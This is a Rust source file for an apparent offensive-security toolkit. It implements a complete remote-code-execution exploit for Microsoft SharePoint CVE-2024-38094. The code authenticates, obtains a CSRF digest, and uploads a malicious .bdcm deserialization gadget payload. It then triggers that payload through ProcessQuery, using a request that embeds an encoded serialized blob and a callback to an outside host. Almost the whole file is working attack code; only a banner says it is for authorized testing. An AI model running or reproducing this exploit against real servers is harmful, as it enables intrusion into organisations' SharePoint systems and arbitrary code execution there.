//! Microsoft SharePoint CVE-2024-38094 - Remote Code Execution
//!
//! **Vulnerability**: Deserialization RCE via malicious .bdcm file upload
//! **Affected**: SharePoint Server 2016, 2019, Subscription Edition (unpatched before July 2024)
//! **CVSS**: 7.2 (High)
//! **Requirements**: Authenticated user with Site Owner privileges
//!
//! ## Attack Chain:
//! 1. Authenticate to SharePoint (NTLM or Basic auth)
//! 2. Obtain X-RequestDigest token for CSRF protection
//! 3. Create BusinessDataMetadataCatalog folder
//! 4. Upload malicious .bdcm file with deserialization payload
//! 5. Trigger deserialization via ProcessQuery endpoint
//!
//! ## Credits:
//! - Original PoC: testanull (https://github.com/testanull/MS-SharePoint-July-Patch-RCE-PoC)
//! - CVE: CVE-2024-38094, CVE-2024-38024, CVE-2024-38023
//!
//! FOR AUTHORIZED SECURITY TESTING ONLY

use anyhow::{anyhow, Context, Result};
use colored::Colorize;
use reqwest::Client;
use serde_json::Value;
use std::io::Write;
use std::time::Duration;

use crate::utils::{prompt_default, prompt_required, prompt_yes_no};

// ============================================================================
// CONSTANTS
// ============================================================================

const DEFAULT_TIMEOUT_SECS: u64 = 30;
const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

// ============================================================================
// PAYLOAD TEMPLATES
// ============================================================================

/// BDCM XML payload template for deserialization attack
/// This payload leverages the SPClickthroughUsageDefinition gadget chain
fn get_bdcm_payload() -> String {
    r#"<?xml version="1.0" encoding="utf-8"?>
<Model xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Name="BDCMetadata" xmlns="http://schemas.microsoft.com/windows/2007/BusinessDataCatalog">
<LobSystems>
<LobSystem Name="QjtvWXFT" Type="DotNetAssembly">
<Properties>
<Property Name="WsdlFetchUrl" Type="System.String">http://localhost:32843/SecurityTokenServiceApplication/securitytoken.svc?singleWsdl</Property>
<Property Name="Class" Type="System.String">RevertToSelf</Property>
</Properties>
<LobSystemInstances>
<LobSystemInstance Name="QjtvWXFT"></LobSystemInstance>
</LobSystemInstances>
<Entities>
<Entity Name="Products" DefaultDisplayName="Products" Namespace="ODataDemo" Version="1.0.0.0" EstimatedInstanceCount="2000">
<Properties>
<Property Name="ExcludeFromOfflineClientForList" Type="System.String">False</Property>
<Property Name="Class" Type="System.String">Microsoft.SharePoint.Administration.SPClickthroughUsageDefinition, Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c</Property>
</Properties>
<Identifiers>
<Identifier Name="ID" TypeName="System.String" />
</Identifiers>
<Methods>
<Method Name="ParseLogFileEntry" DefaultDisplayName="Create Product" IsStatic="false">
<Parameters>
<Parameter Name="@ID" Direction="In">
<TypeDescriptor Name="ID" DefaultDisplayName="ID" TypeName="System.String" CreatorField="true" IdentifierName="ID">
<DefaultValues>
<DefaultValue MethodInstanceName="CreateProduct" Type="System.String">xxxx</DefaultValue>
</DefaultValues>
</TypeDescriptor>
</Parameter>
<Parameter Name="@CreateProduct" Direction="Return">
<TypeDescriptor Name="CreateProduct1" TypeName="System.Object"></TypeDescriptor>
</Parameter>
</Parameters>
<MethodInstances>
<MethodInstance Name="CreateProduct" Type="SpecificFinder" ReturnParameterName="@CreateProduct">
<AccessControlList>
<AccessControlEntry Principal="STS|SecurityTokenService|http://sharepoint.microsoft.com/claims/2009/08/isauthenticated|true|http://www.w3.org/2001/XMLSchema#string">
<Right BdcRight="Execute" />
</AccessControlEntry>
</AccessControlList>
</MethodInstance>
</MethodInstances>
</Method>
</Methods>
</Entity>
</Entities>
</LobSystem>
</LobSystems>
</Model>"#.to_string()
}

/// ProcessQuery trigger payload - triggers the deserialization gadget chain
fn get_trigger_payload() -> String {
    r#"<Request AddExpandoFieldTypeSuffix="true" SchemaVersion="15.0.0.0" LibraryVersion="16.0.0.0" ApplicationName=".NET Library" xmlns="http://schemas.microsoft.com/sharepoint/clientquery/2009">
<Actions>
<ObjectPath Id="21" ObjectPathId="20" />
<ObjectPath Id="23" ObjectPathId="22" />
<ObjectPath Id="25" ObjectPathId="24" />
</Actions>
<ObjectPaths>
<Method Id="20" ParentId="7" Name="GetCreatorView">
<Parameters>
<Parameter Type="String">CreateProduct</Parameter>
</Parameters>
</Method>
<Method Id="22" ParentId="20" Name="GetDefaultValues">
<Parameters/>
</Method>
<Method Id="24" ParentId="7" Name="FindSpecific">
<Parameters>
<Parameter ObjectPathId="19"></Parameter>
<Parameter Type="String">CreateProduct</Parameter>
<Parameter ObjectPathId="18" />
</Parameters>
</Method>
<Identity Id="7" Name="9ccba4bb-d3a8-4255-b87f-18e2d824b848|4da630b6-36c5-4f55-8e01-5cd40e96104d:entityfile:Products,ODataDemo" />
<Identity Id="17" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:notifcallback:avkldkm.c.ultr.cc,CurrentContext" />
<Identity Id="18" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:QjtvWXFT,QjtvWXFT" />
<Identity Id="19" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:identity:StB8AAA==eAAxAAkAeAAyAAkAeAAzAAkAeAA0AAkAeAA1AAkAeAA2AAkAeAA3AAkAeAA4AAkAeAA5AAkAeAAxADAACQB4ADEAMQAJAHgAMQAyAAkAQQBBAEUAQQBBAEEARAAvAC8ALwAvAC8AQQBRAEEAQQBBAEEAQQBBAEEAQQBBAE0AQQBnAEEAQQBBAEUAbABUAGUAWABOADAAWgBXADAAcwBJAEYAWgBsAGMAbgBOAHAAYgAyADQAOQBOAEMANAB3AEwAagBBAHUATQBDAHcAZwBRADMAVgBzAGQASABWAHkAWgBUADEAdQBaAFgAVgAwAGMAbQBGAHMATABDAEIAUQBkAFcASgBzAGEAVwBOAEwAWgBYAGwAVQBiADIAdABsAGIAagAxAGkATgB6AGQAaABOAFcATQAxAE4AagBFADUATQB6AFIAbABNAEQAZwA1AEIAUQBFAEEAQQBBAEMARQBBAFYATgA1AGMAMwBSAGwAYgBTADUARABiADIAeABzAFoAVwBOADAAYQBXADkAdQBjAHkANQBIAFoAVwA1AGwAYwBtAGwAagBMAGwATgB2AGMAbgBSAGwAWgBGAE4AbABkAEcAQQB4AFcAMQB0AFQAZQBYAE4AMABaAFcAMAB1AFUAMwBSAHkAYQBXADUAbgBMAEMAQgB0AGMAMgBOAHYAYwBtAHgAcABZAGkAdwBnAFYAbQBWAHkAYwAyAGwAdgBiAGoAMAAwAEwAagBBAHUATQBDADQAdwBMAEMAQgBEAGQAVwB4ADAAZABYAEoAbABQAFcANQBsAGQAWABSAHkAWQBXAHcAcwBJAEYAQgAxAFkAbQB4AHAAWQAwAHQAbABlAFYAUgB2AGEAMgBWAHUAUABXAEkAMwBOADIARQAxAFkAegBVADIATQBUAGsAegBOAEcAVQB3AE8ARABsAGQAWABRAFEAQQBBAEEAQQBGAFEAMgA5ADEAYgBuAFEASQBRADIAOQB0AGMARwBGAHkAWgBYAEkASABWAG0AVgB5AGMAMgBsAHYAYgBnAFYASgBkAEcAVgB0AGMAdwBBAEQAQQBBAFkASQBqAFEARgBUAGUAWABOADAAWgBXADAAdQBRADIAOQBzAGIARwBWAGoAZABHAGwAdgBiAG4ATQB1AFIAMgBWAHUAWgBYAEoAcABZAHkANQBEAGIAMgAxAHcAWQBYAEoAcABjADIAOQB1AFEAMgA5AHQAYwBHAEYAeQBaAFgASgBnAE0AVgB0AGIAVQAzAGwAegBkAEcAVgB0AEwAbABOADAAYwBtAGwAdQBaAHkAdwBnAGIAWABOAGoAYgAzAEoAcwBhAFcASQBzAEkARgBaAGwAYwBuAE4AcABiADIANAA9AE4AQwA0AHcATABqAEEAdQBNAEMAdwBnAFEAMwBWAHMAZABIAFYAeQBaAFQAMQB1AFoAWABWADAAYwBtAEYAcwBMAEMAQgBRAGQAVwBKAHMAYQBXAE4ATABaAFgAbABVAGIAMgB0AGwAYgBqADEAaQBOAHoAZABoAE4AVwBNADEATgBqAEUANQBNAHoAUgBsAE0ARABnADUAWABWADAAQgBBAEEAQQBBAEMAMQA5AGoAYgAyADEAdwBZAFgASgBwAGMAMgA5AHUAQQB5AEoAVABlAFgATgAwAFoAVwAwAHUAUgBHAFYAcwBaAFcAZABoAGQARwBWAFQAWgBYAEoAcABZAFcAeABwAGUAbQBGADAAYQBXADkAdQBTAEcAOQBzAFoARwBWAHkAQwBRAFUAQQBBAEEAQQBSAEIAQQBBAEEAQQBBAEkAQQBBAEEAQQBHAEIAZwBBAEEAQQBBAHMAdgBZAHkAQgBqAFkAVwB4AGoATABtAFYANABaAFEAWQBIAEEAQQBBAEEAQQAyAE4AdABaAEEAUQBGAEEAQQBBAEEASQBsAE4ANQBjADMAUgBsAGIAUwA1AEUAWgBXAHgAbABaADIARgAwAFoAVgBOAGwAYwBtAGwAaABiAEcAbAA2AFkAWABSAHAAYgAyADUASQBiADIAeABrAFoAWABJAEQAQQBBAEEAQQBDAEUAUgBsAGIARwBWAG4AWQBYAFIAbABCADIAMQBsAGQARwBoAHYAWgBEAEEASABiAFcAVgAwAGEARwA5AGsATQBRAE0ARABBAHoAQgBUAGUAWABOADAAWgBXADAAdQBSAEcAVgBzAFoAVwBkAGgAZABHAFYAVABaAFgASgBwAFkAVwB4AHAAZQBtAEYAMABhAFcAOQB1AFMARwA5AHMAWgBHAFYAeQBLADAAUgBsAGIARwBWAG4AWQBYAFIAbABSAFcANQAwAGMAbgBrAHYAVQAzAGwAegBkAEcAVgB0AEwAbABKAGwAWgBtAHgAbABZADMAUgBwAGIAMgA0AHUAVABXAFYAdABZAG0AVgB5AFMAVwA1AG0AYgAxAE4AbABjAG0AbABoAGIARwBsADYAWQBYAFIAcABiADIANQBJAGIAMgB4AGsAWgBYAEkAdgBVADMAbAB6AGQARwBWAHQATABsAEoAbABaAG0AeABsAFkAMwBSAHAAYgAyADQAdQBUAFcAVgAwAA==" />
</ObjectPaths>
</Request>"#.to_string()
}

// ============================================================================
// EXPLOIT CONFIGURATION
// ============================================================================

/// Configuration for the SharePoint exploit
struct ExploitConfig {
    /// Base SharePoint URL (e.g., https://sharepoint.example.com)
    base_url: String,
    /// Username for authentication (DOMAIN\User or user@domain.com)
    username: String,
    /// Password for authentication
    password: String,
    /// Site path for sub-sites (e.g., /sites/mysite)
    site_path: String,
    /// Whether to target user's personal site (/my/personal/username)
    use_personal_site: bool,
    /// Whether to verify SSL certificates
    verify_ssl: bool,
}

impl ExploitConfig {
    /// Get the full target URL including site path or personal site
    fn get_target_url(&self) -> String {
        if self.use_personal_site {
            // Convert username to SharePoint personal site format
            let safe_username = self.username
                .replace('\\', "_")
                .replace('@', "_")
                .replace('.', "_");
            format!("{}/my/personal/{}", self.base_url, safe_username)
        } else if !self.site_path.is_empty() {
            format!("{}{}", self.base_url, self.site_path)
        } else {
            self.base_url.clone()
        }
    }
    
    /// Get display-friendly site description
    fn get_site_description(&self) -> String {
        if self.use_personal_site {
            format!("Personal site for user '{}'", self.username)
        } else if !self.site_path.is_empty() {
            format!("Sub-site at '{}'", self.site_path)
        } else {
            "Root site".to_string()
        }
    }
}

// ============================================================================
// HTTP CLIENT
// ============================================================================

fn build_client(verify_ssl: bool) -> Result<Client> {
    Client::builder()
        .danger_accept_invalid_certs(!verify_ssl)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .user_agent(USER_AGENT)
        .cookie_store(true)
        .build()
        .context("Failed to build HTTP client")
}

// ============================================================================
// EXPLOIT STEPS
// ============================================================================

/// Step 1: Test authentication and get X-RequestDigest
async fn authenticate_and_get_digest(
    client: &Client,
    config: &ExploitConfig,
) -> Result<(String, String)> {
    println!("{}", "[*] Step 1: Testing authentication...".yellow());
    
    let target_url = config.get_target_url();
    println!("{}", format!("    Target: {} ({})", target_url, config.get_site_description()).cyan());
    println!("{}", format!("    SSL Verification: {}", if config.verify_ssl { "enabled" } else { "disabled" }).cyan());
    
    // Verify we can access the site
    let web_url = format!("{}/_api/web", target_url);
    
    let resp = client
        .get(&web_url)
        .header("Accept", "application/json;odata=verbose")
        .basic_auth(&config.username, Some(&config.password))
        .send()
        .await
        .context("Failed to connect to target")?;
    
    if resp.status().as_u16() == 401 {
        println!("{}", "[-] Authentication failed (HTTP 401)".red());
        println!("{}", "    Note: This module uses HTTP Basic auth.".yellow());
        println!("{}", "    For NTLM-only targets, use the Python PoC.".yellow());
        
        if config.use_personal_site {
            println!("{}", "    Tip: Personal sites may need to be provisioned first.".yellow());
        }
        
        return Err(anyhow!("Authentication failed"));
    }
    
    if !resp.status().is_success() {
        let status = resp.status();
        let body = match resp.text().await {
            Ok(t) => t,
            Err(e) => format!("(failed to read body: {})", e),
        };
        return Err(anyhow!("Web API failed: HTTP {} - {}", status, body));
    }
    
    // Get ServerRelativeUrl
    let web_info_url = format!("{}/_api/web?$select=ServerRelativeUrl", target_url);
    let resp = client
        .get(&web_info_url)
        .header("Accept", "application/json;odata=verbose")
        .basic_auth(&config.username, Some(&config.password))
        .send()
        .await?;
    
    let web_relative_url = if resp.status().is_success() {
        let body: Value = resp.json().await.context("Failed to parse web info")?;
        body["d"]["ServerRelativeUrl"]
            .as_str()
            .unwrap_or("/")
            .to_string()
    } else {
        // Fall back to site_path if available
        if !config.site_path.is_empty() {
            config.site_path.clone()
        } else {
            "/".to_string()
        }
    };
    
    println!("{}", format!("[+] Authenticated! ServerRelativeUrl: {}", web_relative_url).green());
    
    // Get X-RequestDigest (CSRF token)
    let context_url = format!("{}/_api/contextinfo", target_url);
    let resp = client
        .post(&context_url)
        .header("Accept", "application/json;odata=verbose")
        .basic_auth(&config.username, Some(&config.password))
        .send()
        .await
        .context("Failed to get context info")?;
    
    if !resp.status().is_success() {
        return Err(anyhow!("Failed to get X-RequestDigest: HTTP {}", resp.status()));
    }
    
    let body: Value = resp.json().await.context("Failed to parse context info")?;
    let digest = body["d"]["GetContextWebInformation"]["FormDigestValue"]
        .as_str()
        .ok_or_else(|| anyhow!("FormDigestValue not found in response"))?
        .to_string();
    
    let digest_preview = if digest.len() > 40 { &digest[..40] } else { &digest };
    println!("{}", format!("[+] X-RequestDigest: {}...", digest_preview).green());
    
    Ok((digest, web_relative_url))
}

/// Step 2: Create BusinessDataMetadataCatalog folder
async fn create_exploit_folder(
    client: &Client,
    config: &ExploitConfig,
    digest: &str,
    web_path: &str,
) -> Result<String> {
    println!("{}", "[*] Step 2: Creating exploit folder...".yellow());
    
    // Construct folder path based on web context
    let folder_path = if web_path == "/" {
        "/BusinessDataMetadataCatalog".to_string()
    } else {
        format!("{}/BusinessDataMetadataCatalog", web_path)
    };
    
    let target_url = config.get_target_url();
    let folder_url = format!("{}/_api/web/Folders", target_url);
    
    let folder_json = serde_json::json!({
        "__metadata": { "type": "SP.Folder" },
        "ServerRelativeUrl": folder_path
    });
    
    println!("{}", format!("    Creating: {}", folder_path).cyan());
    
    let resp = client
        .post(&folder_url)
        .header("X-RequestDigest", digest)
        .header("Accept", "application/json;odata=verbose")
        .header("Content-Type", "application/json;odata=verbose")
        .basic_auth(&config.username, Some(&config.password))
        .json(&folder_json)
        .send()
        .await
        .context("Failed to create folder")?;
    
    let status = resp.status();
    if status.is_success() {
        println!("{}", format!("[+] Folder created: {}", folder_path).green());
    } else if status.as_u16() == 400 || status.as_u16() == 500 {
        println!("{}", "[*] Folder may already exist (continuing)".yellow());
    } else {
        let body = match resp.text().await {
            Ok(t) => t,
            Err(e) => format!("(failed to read: {})", e),
        };
        println!("{}", format!("[!] Folder creation: HTTP {} - {}", status, body).yellow());
    }
    
    Ok(folder_path)
}

/// Step 3: Upload malicious BDCM file
async fn upload_bdcm_payload(
    client: &Client,
    config: &ExploitConfig,
    digest: &str,
    folder_path: &str,
) -> Result<()> {
    println!("{}", "[*] Step 3: Uploading malicious BDCM file...".yellow());
    
    let payload = get_bdcm_payload();
    let target_url = config.get_target_url();
    
    let upload_url = format!(
        "{}/_api/web/GetFolderByServerRelativeUrl('{}')/Files/add(url='BDCMetadata.bdcm',overwrite=true)",
        target_url, folder_path
    );
    
    println!("{}", format!("    Uploading to: {}/BDCMetadata.bdcm", folder_path).cyan());
    println!("{}", format!("    Payload size: {} bytes", payload.len()).cyan());
    
    let resp = client
        .post(&upload_url)
        .header("X-RequestDigest", digest)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Accept", "*/*")
        .basic_auth(&config.username, Some(&config.password))
        .body(payload)
        .send()
        .await
        .context("Failed to upload BDCM file")?;
    
    if !resp.status().is_success() {
        let status = resp.status();
        let body = match resp.text().await {
            Ok(t) => t,
            Err(e) => format!("(failed to read: {})", e),
        };
        return Err(anyhow!("BDCM upload failed: HTTP {} - {}", status, body));
    }
    
    println!("{}", "[+] BDCM payload uploaded successfully!".green());
    Ok(())
}

/// Step 4: Trigger deserialization vulnerability
async fn trigger_exploit(
    client: &Client,
    config: &ExploitConfig,
    digest: &str,
) -> Result<()> {
    println!("{}", "[*] Step 4: Triggering deserialization...".yellow());
    
    let target_url = config.get_target_url();
    let trigger_url = format!("{}/_vti_bin/client.svc/ProcessQuery", target_url);
    let trigger_payload = get_trigger_payload();
    
    println!("{}", format!("    Endpoint: {}", trigger_url).cyan());
    
    let resp = client
        .post(&trigger_url)
        .header("X-RequestDigest", digest)
        .header("Content-Type", "text/xml")
        .header("X-RequestForceAuthentication", "true")
        .header("Expect", "100-continue")
        .basic_auth(&config.username, Some(&config.password))
        .body(trigger_payload)
        .send()
        .await
        .context("Failed to send trigger request")?;
    
    let status = resp.status();
    let body = match resp.text().await {
        Ok(t) => t,
        Err(e) => {
            println!("{}", format!("[!] Failed to read trigger response: {}", e).yellow());
            String::new()
        }
    };
    
    println!("{}", format!("[*] Trigger response: HTTP {}", status).cyan());
    
    // Deserialization happens during request processing
    if status.is_success() || status.as_u16() == 500 {
        println!("{}", "[+] Trigger sent! Payload should have executed.".green());
        
        // Check for signs of success in response
        if body.contains("ErrorInfo") || body.contains("Exception") {
            println!("{}", "[*] Response contains error info (expected for some payloads)".yellow());
        }
    } else {
        println!("{}", format!("[!] Unexpected response: {}", &body[..body.len().min(200)]).yellow());
    }
    
    Ok(())
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Gather configuration
    let config = gather_config(target)?;
    
    // Offer to check vulnerability first
    if prompt_yes_no("Check SharePoint version before exploiting?", true)? {
        println!("\n{}", "[*] Checking target...".yellow());
        match check_vulnerability(&config.base_url).await {
            Ok(true) => println!("{}", "[+] Target appears to be SharePoint - proceeding\n".green()),
            Ok(false) => {
                if !prompt_yes_no("SharePoint not confirmed. Continue anyway?", false)? {
                    return Err(anyhow!("Exploit cancelled - target verification failed"));
                }
            }
            Err(e) => {
                println!("{}", format!("[!] Check failed: {} - continuing anyway", e).yellow());
            }
        }
    }
    
    // Build HTTP client with SSL settings
    let client = build_client(config.verify_ssl)?;
    
    // Execute exploit chain
    println!("\n{}", "=== Starting Exploit Chain ===".bold());
    
    // Step 1: Authenticate
    let (digest, web_path) = authenticate_and_get_digest(&client, &config).await?;
    
    // Step 2: Create folder
    let folder_path = create_exploit_folder(&client, &config, &digest, &web_path).await?;
    
    // Step 3: Upload BDCM
    upload_bdcm_payload(&client, &config, &digest, &folder_path).await?;
    
    // Step 4: Trigger
    trigger_exploit(&client, &config, &digest).await?;
    
    // Summary
    println!("\n{}", "=== Exploit Complete ===".green().bold());
    println!("{}", format!("Target: {}", config.get_target_url()).cyan());
    println!("{}", format!("Site: {}", config.get_site_description()).cyan());
    println!("\n{}", "Verification:".yellow());
    println!("  1. Check for callback to external server");
    println!("  2. Monitor w3wp.exe process on target");
    println!("  3. Review SharePoint ULS logs");
    
    Ok(())
}

fn display_banner() {
    println!("{}", r#"
╔══════════════════════════════════════════════════════════════════════╗
║   Microsoft SharePoint RCE - CVE-2024-38094                          ║
║   Deserialization via BDCM File Upload                               ║
║   Affected: SharePoint 2016/2019/Subscription (pre-July 2024 patch)  ║
║   CVSS: 7.2 (High) | Requires: Site Owner privileges                 ║
╚══════════════════════════════════════════════════════════════════════╝
"#.red().bold());
    
    println!("{}", "[!] FOR AUTHORIZED SECURITY TESTING ONLY".yellow().bold());
    println!("{}", "[!] Ensure you have written permission before proceeding.\n".yellow());
}

fn gather_config(initial_target: &str) -> Result<ExploitConfig> {
    println!("{}", "=== Configuration ===".bold());
    
    // Base URL
    let base_url = if initial_target.starts_with("http") {
        initial_target.trim_end_matches('/').to_string()
    } else if !initial_target.is_empty() {
        format!("https://{}", initial_target.trim_end_matches('/'))
    } else {
        let input = prompt_required("SharePoint URL (e.g., https://sharepoint.example.com)")?;
        let url = if input.starts_with("http") { input } else { format!("https://{}", input) };
        url.trim_end_matches('/').to_string()
    };
    
    println!("{}", format!("[*] Base URL: {}", base_url).cyan());
    
    // Credentials
    print!("{}", "Username (DOMAIN\\User or user@domain.com): ".green());
    std::io::stdout().flush()?;
    let mut username = String::new();
    std::io::stdin().read_line(&mut username)?;
    let username = username.trim().to_string();
    
    if username.is_empty() {
        return Err(anyhow!("Username is required"));
    }
    
    print!("{}", "Password: ".green());
    std::io::stdout().flush()?;
    let mut password = String::new();
    std::io::stdin().read_line(&mut password)?;
    let password = password.trim().to_string();
    
    if password.is_empty() {
        return Err(anyhow!("Password is required"));
    }
    
    // Personal site option
    let use_personal_site = prompt_yes_no("Target personal site (/my/personal/username)?", false)?;
    
    // Site path (only if not personal site)
    let site_path = if use_personal_site {
        String::new()
    } else {
        prompt_default("Site path (blank for root, e.g., /sites/mysite)", "")?
    };
    
    // SSL verification
    let verify_ssl = !prompt_yes_no("Skip SSL certificate verification?", true)?;
    
    // Build config
    let config = ExploitConfig {
        base_url,
        username,
        password,
        site_path,
        use_personal_site,
        verify_ssl,
    };
    
    // Summary using all config values
    println!("\n{}", "=== Exploit Configuration ===".bold());
    println!("  Base URL:      {}", config.base_url);
    println!("  Target URL:    {}", config.get_target_url());
    println!("  Username:      {}", config.username);
    println!("  Site Type:     {}", config.get_site_description());
    println!("  Verify SSL:    {}", if config.verify_ssl { "yes" } else { "no" });
    
    if !prompt_yes_no("\nProceed with exploit?", true)? {
        return Err(anyhow!("Exploit cancelled by user"));
    }
    
    Ok(config)
}

/// Check if target is potentially vulnerable by examining SharePoint headers
pub async fn check_vulnerability(target: &str) -> Result<bool> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;
    
    let url = if target.starts_with("http") {
        target.to_string()
    } else {
        format!("https://{}", target)
    };
    
    println!("[*] Checking SharePoint version at: {}", url);
    
    let resp = client
        .get(&url)
        .send()
        .await
        .context("Failed to connect to target")?;
    
    let headers = resp.headers();
    
    // Check for SharePoint version header
    if let Some(sp_version) = headers.get("MicrosoftSharePointTeamServices") {
        let version = sp_version.to_str().unwrap_or("");
        println!("[+] SharePoint Version: {}", version);
        
        if version.starts_with("16.") {
            println!("{}", "[!] SharePoint 2016/2019/SE detected - potentially vulnerable".yellow());
            return Ok(true);
        }
    }
    
    // Check for health score header
    if let Some(health_score) = headers.get("X-SharePointHealthScore") {
        let score = health_score.to_str().unwrap_or("?");
        println!("[+] SharePoint detected (Health Score: {})", score);
        return Ok(true);
    }
    
    println!("{}", "[!] Could not confirm SharePoint installation".yellow());
    Ok(false)
}
